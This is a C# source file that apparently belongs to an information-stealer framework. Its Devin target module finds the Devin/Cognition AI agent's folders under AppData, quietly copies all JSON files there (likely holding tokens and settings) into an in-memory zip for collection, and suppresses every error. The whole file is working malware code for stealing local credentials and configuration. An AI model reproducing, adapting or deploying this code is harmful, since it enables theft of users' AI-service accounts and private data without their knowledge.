using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Devin : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string[] paths = {
                Path.Combine(appdata, "Devin"),
                Path.Combine(local, "Programs", "devin"),
                Path.Combine(appdata, "Cognition")
            };
            foreach (string dir in paths)
            {
                if (!Directory.Exists(dir)) continue;
                var entry = new Counter.CounterApplications { Name = "Devin" };
                foreach (string file in Directory.GetFiles(dir, "*.json", SearchOption.AllDirectories))
                {
                    if (new FileInfo(file).Length > 2 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\Devin\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
                if (entry.Files.Count > 0) { counter.AI.Add(entry); break; }
            }
        }
    }
}
